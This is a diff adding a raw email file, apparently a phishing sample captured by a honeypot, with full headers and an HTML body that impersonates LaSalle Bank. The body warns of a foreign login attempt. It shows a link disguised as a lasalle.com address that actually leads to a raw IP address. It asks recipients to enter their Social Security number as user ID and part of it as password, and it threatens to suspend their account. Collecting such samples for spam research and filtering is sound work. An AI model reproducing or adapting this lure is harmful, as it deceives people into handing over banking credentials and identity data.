@@ -1,0 +1,79 @@
+Received: from mail.yourwebmail.org (207.44.232.33)
+  by projecthoneypotmailserver with SMTP; 21 Jun 2005 18:27:52 -0000
+Received: from web01 by mail.yourwebmail.org with local (Exim 4.50)
+	id 1DknTV-0001s1-E7
+	for projecthoneypot@projecthoneypot.org; Tue, 21 Jun 2005 13:27:53 -0500
+To: projecthoneypot@projecthoneypot.org
+Subject: Fraud login attempt
+Message-ID: <1119378473.15086.qmail@lasallebank.com>
+From: "Lasalle Bank" <security@lasallebank.com>
+Content-Type: text/html
+Date: Tue, 21 Jun 2005 13:27:53 -0500
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - mail.yourwebmail.org
+X-AntiAbuse: Original Domain - honeypot.dyn.nu
+X-AntiAbuse: Originator/Caller UID/GID - [32004 100] / [47 12]
+X-AntiAbuse: Sender Address Domain - mail.yourwebmail.org
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+
+<html>
+
+<head>
+<meta http-equiv="Content-Language" content="en-us">
+<meta name="GENERATOR" content="Microsoft FrontPage 5.0">
+<meta name="ProgId" content="FrontPage.Editor.Document">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>Dear LaSalle Bank customer</title>
+<style>
+<!--
+ p.MsoNormal
+	{mso-style-parent:"";
+	margin-bottom:.0001pt;
+	font-size:12.0pt;
+	font-family:"Times New Roman";
+	margin-left:0in; margin-right:0in; margin-top:0in}
+-->
+</style>
+</head>
+
+<body>
+
+<p class="MsoNormal">
+<img border="0" src="http://www.lasallebank.com/templates/images/lasalle_logo.gif" width="146" height="54"></p>
+<p class="MsoNormal">&nbsp;</p>
+<p class="MsoNormal"><font size="2" face="Verdana">Dear LaSalle Bank customer,</font></p>
+<p class="MsoNormal"><font size="2" face="Verdana">&nbsp;</font></p>
+<p class="MsoNormal" style="text-indent: .5in"><font size="2" face="Verdana">We 
+recently noticed one or more attempts to login intro your LaSalle Bank online 
+banking account for a foreign IP address and we have reasons to believe that 
+your account was hijacked by a third party without your notification.</font></p>
+<p class="MsoNormal"><font size="2" face="Verdana">&nbsp;</font></p>
+<p class="MsoNormal"><font size="2" face="Verdana">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If you recently 
+logged intro your account while traveling to a foreign country, the unusual 
+login attempts may have been made by you.</font></p>
+<p class="MsoNormal"><font size="2" face="Verdana">&nbsp;</font></p>
+<p class="MsoNormal"><font size="2" face="Verdana">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; However if you 
+are the rightful owner of the account, click on the link below and submit as we 
+are truing to verify your account information. (In case you are not enrolled use 
+your Social Security number as you User ID and the first six digits of your 
+Social Security number as a password).</font></p>
+<p class="MsoNormal"><font size="2" face="Verdana">&nbsp;</font></p>
+<p class="MsoNormal"><font size="2" face="Verdana">
+<a style="color: blue; text-decoration: underline; text-underline: single" href="http://210.143.94.99/.cgi-bin/www.lasalle.com/index.php">https://lasalle.com/online/unlock_profile.jsp</a></font></p>
+<p class="MsoNormal"><font size="2" face="Verdana">&nbsp;</font></p>
+<p class="MsoNormal"><font size="2" face="Verdana">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The login attempt 
+was made from :</font></p>
+<p class="MsoNormal"><font size="2" face="Verdana">&nbsp;</font></p>
+<p class="MsoNormal"><font size="2" face="Verdana">IP: 64.60.192.130</font></p>
+<p class="MsoNormal"><font size="2" face="Verdana">ISP Host: 
+64-60-192-130.cust.telepacific.net</font></p>
+<p class="MsoNormal"><font size="2" face="Verdana">&nbsp;</font></p>
+<p class="MsoNormal"><font size="2" face="Verdana">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IF YOU CHOSE TO 
+IGNORE OUR REQUEST, WE HAVE NO CHOICE BUT TO TEMPORARILY SUSPEND YOUR ONLINE 
+BANKING ACCOUNT.</font></p>
+
+</body>
+
+</html>
